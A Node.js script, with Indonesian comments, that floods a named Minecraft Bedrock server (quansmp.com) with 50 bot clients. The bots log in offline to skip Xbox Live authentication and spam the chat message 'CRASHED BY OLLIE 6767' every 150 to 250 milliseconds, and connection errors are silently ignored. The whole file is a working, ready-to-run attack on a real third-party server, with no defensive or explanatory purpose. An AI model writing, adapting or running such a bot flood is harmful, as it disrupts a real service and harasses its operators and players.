// bot.js — Bedrock Bot Spam (QuanSMP)
const bedrock = require('bedrock-protocol');

// ================= CONFIG =================
const SERVER_HOST = 'quansmp.com';
const SERVER_PORT = 19132; // BEDROCK PORT (UDP)
const BOT_COUNT = 50; // 50 bot per runner
const SPAM_MESSAGE = 'CRASHED BY OLLIE 6767';
const SPAM_DELAY_MS = 150; 
// ==========================================

console.log(`[*] Starting ${BOT_COUNT} Bedrock bots to ${SERVER_HOST}:${SERVER_PORT}`);

function createBot(id) {
    try {
        const client = bedrock.createClient({
            host: SERVER_HOST,
            port: SERVER_PORT,
            username: `Bot_${id}_${Math.floor(Math.random() * 9999)}`,
            offline: true, // Fake login tanpa Xbox Live
            version: '1.20.80', // Sesuaikan sama versi server QuanSMP
            // skipPing: true
        });

        client.on('spawn', () => {
            console.log(`[+] Bot ${id} spawned.`);
            // Mulai spam chat
            setInterval(() => {
                if (client.queue) {
                    client.queue('text', {
                        type: 'chat',
                        needs_translation: false,
                        source_name: client.options.username,
                        message: SPAM_MESSAGE,
                        xuid: '',
                        platform_chat_id: '',
                        filtered_message: ''
                    });
                }
            }, SPAM_DELAY_MS + Math.random() * 100);
        });

        client.on('kick', (reason) => {
            console.log(`[-] Bot ${id} kicked: ${JSON.stringify(reason)}`);
        });

        client.on('error', (err) => {
            // Abaikan error handshake/timeout
        });

        client.on('close', () => {
            console.log(`[-] Bot ${id} disconnected.`);
        });
    } catch (e) {
        console.log(`[!] Bot ${id} failed to start: ${e.message}`);
    }
}

// Spawn bots dengan delay
async function start() {
    for (let i = 0; i < BOT_COUNT; i++) {
        createBot(i);
        await new Promise(r => setTimeout(r, 150));
    }
}

start();
